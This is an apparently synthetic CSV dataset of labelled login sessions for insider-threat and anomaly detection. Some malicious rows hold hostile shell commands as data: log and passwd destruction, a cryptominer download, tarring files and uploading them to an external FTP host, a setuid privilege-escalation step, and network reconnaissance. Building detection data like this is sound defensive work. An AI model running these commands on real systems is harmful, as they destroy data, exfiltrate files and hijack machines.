timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2024-12-26 17:49:45,user_0124,employee,13,4,888,100,3,1,1,1,mfa,10.50.171.221,"London, UK",cc5446823b71e1d8e49bacee49980db1,email_server,ls -la; cat report.txt; logout,1,Normal
2024-08-14 04:27:36,user_0009,employee,11,1,1992,137,2,1,1,1,mfa,10.196.223.68,"Tokyo, JP",5d13b1d7575183ee4a778a3335d9f5e0,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-02 07:41:40,user_0149,contractor,8,0,1791,73,4,1,1,1,password,192.168.51.238,"Berlin, DE",3dabce862c47ead8f85476a78a10e7b7,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-09 04:51:41,user_0087,employee,12,3,1978,76,5,0,1,1,sso,192.168.78.233,"London, UK",cbc52a50fdb3b8451ab7f44c9f27ff1b,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-17 16:40:16,user_0129,contractor,14,3,1916,115,4,1,1,1,mfa,192.168.71.150,"Singapore, SG",4ad704339a0e36ad3f25e9a67f947baa,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-11-23 13:14:47,user_0017,employee,13,4,1738,48,3,0,1,1,sso,192.168.17.181,"London, UK",02c532c7036161016530631306ec770e,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-10-12 03:28:36,user_0139,contractor,8,4,1852,67,1,1,1,1,sso,172.27.16.5,"London, UK",26545d7ba4beca77ab179b031b8c731b,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-25 11:51:21,user_0091,admin,4,6,517,738,4,6,1,1,password,192.168.72.43,"Mexico City, MX",bdd8229f12f79ad53a85751da666839f,customer_data,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2025-03-14 06:19:07,user_0069,employee,10,0,651,191,3,1,1,1,sso,10.139.217.164,"London, UK",b0f93364b88162d410fe436c4dab2447,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-25 23:56:45,user_0080,admin,6,3,49298,634,5,6,1,0,password,114.123.113.175,"Mexico City, MX",5018069a5fa9b4570df094b043b21299,payroll_system,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2025-01-04 17:30:55,user_0012,contractor,16,1,2992,198,1,1,1,1,password,10.181.53.86,"Tokyo, JP",b4fc9716d823ac7e0092911df643ee2d,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-31 00:33:08,user_0190,employee,8,0,866,189,2,1,1,1,mfa,10.189.13.255,"Tokyo, JP",618e6de74cdb1927045b55d988aa753f,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-26 22:33:16,user_0060,admin,4,4,58891,479,4,5,1,0,password,199.204.42.180,"Toronto, CA",c5a8e5345367060cedc0cc9ddf77bf6f,source_code_repo,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-01-17 04:14:26,user_0086,employee,12,0,999,193,1,1,1,1,mfa,10.115.121.13,"Singapore, SG",41f23f761cd116b38fe924bc5b08d826,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-01 07:45:14,user_0004,contractor,9,3,871,99,5,1,1,1,password,192.168.160.15,"Tokyo, JP",770218a4c9e494850fa07274732d33f2,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-08 08:10:36,user_0087,contractor,18,0,1225,123,5,1,1,1,sso,172.17.30.197,"London, UK",e1d706b0d47ad79144e170bd7f46a49b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-17 14:14:33,user_0196,contractor,15,3,910,103,1,1,1,1,mfa,10.114.35.145,"London, UK",14eb88e00d8675c091d3edf79ad68bed,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-01-04 10:48:59,user_0076,service_account,22,5,4137,1764,17,0,1,1,api_key,10.71.105.0,"Cape Town, ZA",715374a1208dffcafe5d473c0bfbe61f,compliance_dashboard,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-03-27 05:04:27,user_0082,contractor,11,1,1721,187,5,1,1,1,mfa,172.18.231.203,"Singapore, SG",761a3467db8da28a44ee6495acbf7300,email_server,ls -la; cat report.txt; logout,1,Normal
2024-09-19 18:22:51,user_0172,employee,14,1,2273,108,4,0,1,1,sso,192.168.168.62,"Singapore, SG",6640abd1c0c30e0cded594cc1b87e315,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-05-24 09:58:56,user_0081,contractor,9,0,3346,112,2,1,1,1,password,10.150.62.80,"Singapore, SG",9b7d6feb7de94200d424ee98dbde329e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-17 08:13:09,user_0122,employee,13,1,2903,97,3,1,1,1,password,10.113.32.186,"Berlin, DE",4603c64246f491f6f4517806df0354e0,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-21 01:46:10,user_0086,contractor,13,4,1637,92,3,0,1,1,sso,10.42.112.117,"Singapore, SG",b1474d14bdfa202b4970228fb89c6647,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-04-22 17:45:58,user_0034,employee,11,1,880,61,5,0,1,1,sso,172.26.43.155,"New York, US",ccbd48686e8dbd16521e013e2060b049,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-03 12:47:56,user_0177,employee,15,2,1825,25,3,1,1,1,mfa,192.168.130.9,"Berlin, DE",f5b87e6dff261943d2dc8d21f5455329,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-01 05:27:27,user_0125,contractor,10,3,742,51,3,1,1,1,mfa,192.168.156.137,"London, UK",0117e58effbffe5e2a6b942e242d3e9e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-13 11:29:21,user_0075,employee,16,4,2993,193,2,0,1,1,password,172.27.241.238,"Singapore, SG",297eae93aab619196c8c406d31cd8014,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-04 06:47:48,user_0153,admin,23,4,4602,1305,10,2,1,1,sso,192.168.133.43,"Beijing, CN",77d24aba462c9be4b77b5b7ddca7b466,secrets_vault,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2025-04-02 09:00:50,user_0061,contractor,8,1,1386,33,2,1,1,1,sso,10.129.171.194,"New York, US",f3004392aba68cd20e27ec9ea14f546d,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-03 17:34:50,user_0106,contractor,8,0,1445,118,2,1,1,1,password,192.168.119.232,"Singapore, SG",e016a8f4fabbcdd3ee0c774c5b4cec9a,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-11-27 04:06:04,user_0144,contractor,11,3,2879,67,2,1,1,1,mfa,192.168.17.74,"New York, US",891f798ca2237b3355c47661d5825438,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-23 13:40:01,user_0013,employee,8,2,450,57,1,1,1,1,mfa,192.168.185.92,"New York, US",e4e30d9ec476f8ed7e91d2003be382ff,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-02-09 06:05:53,user_0100,contractor,15,3,1618,54,3,0,1,1,password,192.168.146.186,"Berlin, DE",4dd4e03d20f0e720cfe62bf0869260ac,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-09 02:36:19,user_0072,employee,16,3,1951,80,1,1,1,1,mfa,192.168.34.148,"Singapore, SG",51dc7c4a83447974324febb8c7727377,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-13 03:06:17,user_0065,contractor,15,0,3306,197,1,1,1,1,mfa,10.94.116.126,"Berlin, DE",fdee88575ec41c53d5cebaac6e961ffb,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-22 05:43:07,user_0004,contractor,15,4,323,175,4,0,1,1,password,10.140.25.240,"Singapore, SG",dbc0c3f40f9800199f907675a434cc68,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-17 18:07:14,user_0026,admin,2,6,612,691,11,0,1,1,certificate,172.29.200.190,"Sao Paulo, BR",791d4e5462a39d8e0f9ced756a2b6aa4,internal_wiki,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-02-07 03:41:41,user_0058,employee,10,0,1622,196,4,0,1,1,password,192.168.88.183,"New York, US",1d1ff9eea7a948f1762875ee7aea3ead,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-12 12:00:58,user_0182,contractor,11,4,1018,116,3,1,1,1,password,172.27.69.148,"London, UK",f0b81e6aeb6f55cd4fe45be4455c7738,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-17 08:58:31,user_0153,employee,14,3,3255,54,1,1,1,1,password,192.168.158.212,"Tokyo, JP",c3219840e9441e36a3b32ed43f4da6a8,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-22 19:41:32,user_0132,employee,12,1,2682,34,2,1,1,1,mfa,10.44.244.56,"London, UK",5077ffdfa8d67489ac76acb7d0c8b366,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-06 21:25:43,user_0013,employee,16,4,1448,128,4,1,1,1,password,10.202.241.238,"Tokyo, JP",aa532c0f01b1f821d470a24a511967a8,email_server,ls -la; cat report.txt; logout,1,Normal
2024-09-10 21:22:55,user_0013,contractor,12,1,358,99,3,1,1,1,mfa,10.33.195.216,"Tokyo, JP",0e6f34dcbf4bc4eade861543ac24b991,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-15 19:49:52,user_0067,employee,11,2,877,44,2,0,1,1,password,192.168.173.190,"Singapore, SG",b9798c8c589f19aa979f9660b5f022af,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-19 00:57:23,user_0162,contractor,15,0,2891,132,2,0,1,1,password,172.22.71.84,"London, UK",28e9608eb42c682ceb373d086a79c263,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-04 13:39:06,user_0066,employee,2,6,771,1489,5,0,1,1,certificate,192.168.16.164,"Mumbai, IN",6b9edd33efa06c2c80d3449523ef74bc,secrets_vault,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-03-10 22:47:45,user_0027,employee,17,3,2455,139,1,0,1,1,sso,192.168.75.245,"London, UK",d0ef86a69a3eabf87f4019dbcf28e851,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-10-19 20:17:29,user_0015,employee,17,2,1164,115,1,1,1,1,password,172.23.202.25,"Tokyo, JP",b295f994de066a4352974b5f100d6285,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-05-25 08:26:53,user_0119,employee,14,4,2459,197,5,0,1,1,mfa,10.214.119.199,"New York, US",960fd1651db775ec36c3b20b3c7ba1f9,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-05-27 00:02:04,user_0174,employee,18,0,2870,185,1,1,1,1,mfa,10.150.26.3,"New York, US",223e59b821b42fa9dafb80a0e058c6b3,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-14 22:00:36,user_0146,employee,16,4,3427,91,5,1,1,1,mfa,192.168.25.48,"Berlin, DE",80749e5f86a14daec336d788ed4c01af,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-12 04:45:24,user_0101,contractor,0,3,96,1179,16,1,0,0,password,118.98.134.7,"Mumbai, IN",67d1d36f92f04d6251403d970eba1d29,compliance_dashboard,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-07-27 11:44:40,user_0129,employee,14,2,3467,159,2,0,1,1,password,10.75.31.221,"Tokyo, JP",d84fce14ad96f7e789721bd38dc74af0,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-05-23 14:57:56,user_0022,contractor,12,1,1313,92,4,0,1,1,password,172.21.238.111,"Singapore, SG",c3bcb436ec48a9f6b1014db904268683,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-13 04:12:38,user_0171,contractor,11,1,3482,136,5,1,1,1,password,192.168.242.51,"London, UK",a3d9e5a308ca60815fedc4684b4b44f1,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-03-08 04:32:02,user_0052,contractor,11,1,2422,29,4,1,1,1,password,10.209.220.153,"New York, US",f54301c87e50cc1ece7c91ce51113abc,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-16 22:56:18,user_0091,employee,16,0,766,189,4,0,1,1,password,172.22.77.96,"Tokyo, JP",6c5cbb5c57b06bde7815e0b5313ff1fa,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-25 18:02:36,user_0172,contractor,11,4,2844,82,1,1,1,1,mfa,172.20.117.98,"New York, US",d81bfe5d700e38c3f4a16dd1f135be19,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-30 19:41:09,user_0105,employee,13,0,1992,168,2,1,1,1,mfa,10.37.69.116,"Tokyo, JP",04b3cad047765aad14511a79f76132b6,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-22 08:46:45,user_0155,employee,16,0,1961,47,3,0,1,1,mfa,10.153.22.206,"Singapore, SG",33fc0ad3d798f75ff26257b20578f319,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-22 08:33:29,user_0080,employee,18,2,1402,33,2,0,1,1,password,192.168.225.181,"Singapore, SG",9aef9a14069b55be2f2b3b916aad2295,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-02 12:31:16,user_0150,employee,17,3,2742,144,5,1,1,1,password,10.171.164.27,"Berlin, DE",bd5b97ffb7e195da39628970aeda8c50,email_server,ls -la; cat report.txt; logout,1,Normal
2024-11-25 23:53:08,user_0092,contractor,11,2,1443,117,4,0,1,1,sso,10.161.23.209,"Tokyo, JP",5f926686e2a3195998028124660dbc8b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-12-23 19:55:54,user_0007,employee,8,4,2199,51,3,1,1,1,mfa,10.119.100.204,"Tokyo, JP",b552cc91e0d4f10f2fe341ddb5f72dd3,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-11-05 18:36:17,user_0026,contractor,17,3,471,153,5,0,1,1,mfa,192.168.133.111,"Singapore, SG",fce982be4015162a0b60c53f0a96dcc8,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-16 11:11:14,user_0083,employee,8,0,2866,83,2,1,1,1,mfa,192.168.62.191,"London, UK",cec42c7f9379d927cef69248d7af7ba4,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-02-10 15:00:02,user_0002,contractor,16,3,1682,153,4,0,1,1,mfa,172.30.166.98,"New York, US",f9355b3ee6c3b113d62ebd065a50e9a6,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-28 04:27:37,user_0008,employee,16,0,1576,94,1,1,1,1,sso,172.17.191.102,"London, UK",60680b1cb49984fecaef7dd680ba0981,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-03 00:07:54,user_0152,contractor,11,1,2182,30,2,1,1,1,sso,192.168.219.80,"London, UK",e3714cc7e2ca2163efaa07728a16a88f,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-01-24 17:53:17,user_0161,employee,4,2,66,468,15,5,0,0,password,86.248.149.42,"Sao Paulo, BR",ef51efd0e27a9341aad4e02575fe2785,payroll_system,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-12-19 18:02:07,user_0132,contractor,12,1,1513,88,5,0,1,1,password,172.22.235.89,"London, UK",caf5a90ac26b92a88528471361a8efeb,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-12 03:04:14,user_0005,employee,10,0,3594,158,1,0,1,1,sso,192.168.113.88,"Tokyo, JP",5ae7acefbc6241a5cdb20d0bc8476ee3,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-07-28 20:00:47,user_0046,employee,16,1,2552,20,3,0,1,1,mfa,172.25.85.90,"Singapore, SG",e7c6cf0ac042ce348e698ca4713cc3f4,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-01 22:02:59,user_0064,employee,13,2,557,180,1,0,1,1,mfa,192.168.152.121,"Tokyo, JP",12cc878d8fd5a8b9ae63dfba988686c6,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-22 12:06:51,user_0123,employee,13,1,3276,160,4,1,1,1,mfa,192.168.166.119,"London, UK",eb1bd69c4a3320e3c107fe6420d5dc5e,email_server,ls -la; cat report.txt; logout,1,Normal
2024-04-09 08:21:34,user_0141,employee,11,3,1667,140,4,1,1,1,sso,10.155.107.207,"Berlin, DE",e5dee0afb026bdc1fd8b99d744314b2d,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-06-06 03:04:23,user_0033,contractor,21,6,6883,953,13,1,0,1,sso,192.168.237.49,"Moscow, RU",6d18e10facb4104a589e77cd0866bd3c,devops_pipeline,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2025-05-16 18:08:28,user_0184,contractor,14,1,1377,40,4,0,1,1,sso,192.168.159.36,"Singapore, SG",7351425617d1a7b435b2d0b849462c2b,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-22 17:38:14,user_0063,admin,21,1,6260,1729,7,1,1,1,sso,192.168.42.16,"Mexico City, MX",969caf18d687548f89afabe012ba8888,vpn_gateway,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2025-04-23 22:58:56,user_0013,admin,5,4,79180,639,4,2,0,0,password,15.172.140.158,"Cape Town, ZA",c98bb5f9af781e0562c06a72964d6b7d,compliance_dashboard,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-06-20 07:29:28,user_0035,vendor,6,3,666,1451,12,3,1,1,certificate,192.168.205.135,"Mexico City, MX",b6c035cc90179be02b17299087247d1b,backup_storage,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-12-23 20:30:08,user_0170,contractor,13,4,2229,21,5,1,1,1,password,192.168.136.137,"London, UK",bbaf9661c8301b06ec285e12e318824c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-06-13 05:07:27,user_0199,service_account,0,0,115,479,7,4,0,0,password,134.97.244.42,"Beijing, CN",bcb64ad3dc2994786b996b69ccfb09f6,crm_platform,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-04-23 23:09:31,user_0194,employee,15,4,1493,119,5,1,1,1,password,192.168.120.20,"London, UK",1e1f2d0a634bbd7909fb3a0f90116093,email_server,ls -la; cat report.txt; logout,1,Normal
2024-10-14 05:47:24,user_0195,contractor,14,3,2219,56,1,1,1,1,password,10.161.193.115,"Tokyo, JP",3b56d3e42f7f18753f8a8c9a954b1693,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-30 02:43:46,user_0144,contractor,17,2,1147,67,1,0,1,1,sso,172.23.73.156,"London, UK",eb182011e2561a7aeeb7471e50b6f64f,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-06-23 08:23:52,user_0127,employee,11,1,2103,185,2,0,1,1,password,172.25.179.32,"Berlin, DE",4b8d5db8a959732c3157a09a031a0e54,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-06-26 15:34:43,user_0117,service_account,23,2,4589,951,17,0,1,1,sso,172.27.154.73,"Moscow, RU",4d747e9e3c958c3b52a9cd333424d46d,admin_console,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2024-01-03 09:54:58,user_0188,employee,10,4,3169,179,4,1,1,1,sso,10.233.151.178,"London, UK",d0ec17c4d12ad8a647b4789c5f3efb3d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-26 03:00:01,user_0088,employee,12,1,3286,25,1,1,1,1,mfa,10.66.97.113,"Berlin, DE",e22f99c1e248072bc1c2375ccf5b5644,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-12-03 11:30:04,user_0129,employee,10,3,2590,70,4,1,1,1,sso,172.16.73.189,"Singapore, SG",c7cae3fdc43397a8c8ea1db78e6df0aa,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-28 15:44:18,user_0012,employee,16,1,2128,64,1,0,1,1,mfa,10.2.34.44,"New York, US",acaea862447306c6382f54aaa070cb0d,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-03 04:37:12,user_0174,employee,16,0,560,106,4,0,1,1,sso,172.17.142.227,"London, UK",c27cea9c09301902066e0e57bd458560,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-12-08 00:47:09,user_0147,contractor,15,0,2508,64,1,0,1,1,mfa,172.30.178.80,"Singapore, SG",425eafe8bafd2a79df71974e20e4d5f7,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-24 06:57:24,user_0106,employee,16,0,3440,127,1,0,1,1,sso,192.168.214.233,"Berlin, DE",9b8617c16e33c2f715b950a0ee0b387a,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-10 23:21:22,user_0153,contractor,9,2,2167,90,2,1,1,1,mfa,10.165.22.115,"London, UK",cfd10aeb5dcf914a0ec5029f07297887,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-11-09 07:20:16,user_0176,contractor,13,4,395,165,1,0,1,1,password,172.23.33.230,"Berlin, DE",6dd949d897dc68b9a0d5c7c6b3407af2,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-31 08:47:20,user_0131,employee,18,1,3478,24,2,1,1,1,sso,192.168.207.70,"Singapore, SG",cd8a9cefb31fad448e0f96cc06d21081,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-05 22:23:10,user_0146,contractor,17,0,926,187,1,1,1,1,mfa,172.26.198.13,"Berlin, DE",297d4aface9b4a26ddc762ffd4bd200c,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-01-20 18:14:54,user_0141,contractor,10,0,2254,20,2,0,1,1,mfa,192.168.159.36,"London, UK",5161b320d5385eee6984356e0b7dc9fe,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-06 22:41:44,user_0192,employee,16,1,2910,120,1,0,1,1,mfa,192.168.24.76,"London, UK",445c523458e54045dfa92c0c9ed812af,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-21 07:23:59,user_0045,service_account,21,3,6807,1417,16,5,1,0,sso,172.21.68.104,"Mexico City, MX",bb1879cdc270a9b2e0aafafa3235b35c,hr_portal,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2025-03-29 18:55:32,user_0038,employee,12,2,3253,150,5,1,1,1,mfa,172.21.179.117,"Singapore, SG",e3f4f16d57303dff55b5221acf8680f0,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-07-24 04:54:13,user_0118,employee,16,3,3067,117,2,1,1,1,password,192.168.189.28,"New York, US",6fa3788fbbbe7492db3aa8af5f15cc2f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-06 14:25:48,user_0095,contractor,17,3,2915,115,1,0,1,1,mfa,10.10.181.145,"New York, US",87dd4b55a15ce4b24f9671ce1a86af87,email_server,ls -la; cat report.txt; logout,1,Normal
2025-02-28 19:40:29,user_0102,employee,13,3,501,67,2,1,1,1,mfa,172.23.194.179,"New York, US",b2ceed47079210877c15e018cecd335a,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-17 21:52:52,user_0003,vendor,5,5,317,1378,11,1,1,1,password,172.27.115.107,"Mexico City, MX",cc0519db66c22a0e2505e68c6fb3c72c,source_code_repo,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2025-05-16 20:12:18,user_0119,contractor,9,4,763,66,5,0,1,1,mfa,192.168.238.50,"Tokyo, JP",ef1023876e75f7cd07282110ca05c078,email_server,ls -la; cat report.txt; logout,1,Normal
2024-10-25 17:22:17,user_0143,contractor,14,1,1481,191,2,0,1,1,password,192.168.85.129,"New York, US",a16e8808e2644b53ff49d55d2f96438e,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-04-08 10:44:56,user_0105,employee,17,0,939,77,4,1,1,1,password,10.97.57.176,"New York, US",8821a2905a9022a5ad35fa0a0889706e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-11 03:30:29,user_0019,contractor,14,4,1204,127,4,1,1,1,sso,192.168.224.250,"New York, US",fe83c2a45790d199e2e349a9b5c51d5b,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-17 13:45:02,user_0131,contractor,13,1,2357,104,5,0,1,1,mfa,172.16.242.226,"Tokyo, JP",238435de83666d3db52d7a27fce5b262,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-08-03 05:24:37,user_0151,admin,8,6,2969,105,2,0,0,0,oauth,178.184.112.165,"Amsterdam, NL",0a22f8a3090edb6d0328e3e999f686e4,secrets_vault,ls -la; cat report.txt; logout,1,Impossible Travel
2025-03-20 22:24:52,user_0180,contractor,17,0,1045,174,3,0,1,1,sso,192.168.36.93,"Singapore, SG",47f92937d3ae16f5ef7b14cec0def556,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-31 01:52:44,user_0098,contractor,11,1,2185,109,3,0,1,1,password,192.168.210.37,"New York, US",78e042902f674f7cf52af7500eb748b0,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-17 18:46:04,user_0005,employee,10,4,3278,175,5,1,1,1,password,10.221.249.56,"Berlin, DE",705c9713df7bdf6ac37260584c823d90,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-18 11:31:09,user_0031,employee,17,4,462,178,1,1,1,1,sso,192.168.138.4,"Singapore, SG",3fdd08286598b44865c0dd02ebb0e96f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-25 23:47:12,user_0190,employee,9,0,3312,56,4,0,1,1,mfa,10.103.73.1,"Singapore, SG",b2ee6319ff13d03b23e6f6be62067d18,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-24 16:01:48,user_0159,employee,17,3,2884,104,1,0,1,1,password,192.168.165.33,"London, UK",4abf5edcffd7d7f722ed96bfae29c8f4,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-22 16:57:51,user_0147,employee,18,0,1043,184,4,1,1,1,sso,172.30.236.147,"Berlin, DE",691a657826d98ede3825a8e79ebf080f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-09-07 15:12:46,user_0047,contractor,10,2,1304,38,2,1,1,1,mfa,192.168.94.16,"London, UK",880e395c7daf52c87de7eb3673b7d9a8,email_server,ls -la; cat report.txt; logout,1,Normal
2024-06-02 18:04:48,user_0064,employee,8,2,2642,69,4,1,1,1,mfa,172.24.116.83,"London, UK",fd847ae9c05ae7eded7b9e32ca4a8934,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-01-13 06:31:36,user_0083,contractor,10,4,769,192,4,0,1,1,mfa,172.20.159.47,"Berlin, DE",6910862ccca8db1f2dab767504885df6,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-28 16:40:10,user_0131,employee,11,4,1349,105,2,1,1,1,mfa,172.24.176.57,"Tokyo, JP",3c4cc809b0b46b4e88508d187b13d784,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-25 03:31:08,user_0053,employee,16,0,2160,60,4,0,1,1,sso,10.249.139.80,"London, UK",f3bb41818510ed76a780115dce6c37e3,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-06-19 23:24:01,user_0007,employee,9,1,2409,155,4,1,1,1,mfa,10.195.227.73,"London, UK",6ae21877d5caf490a16f04d1a3a0344e,payroll_system,ls -la; cat report.txt; logout,1,Normal
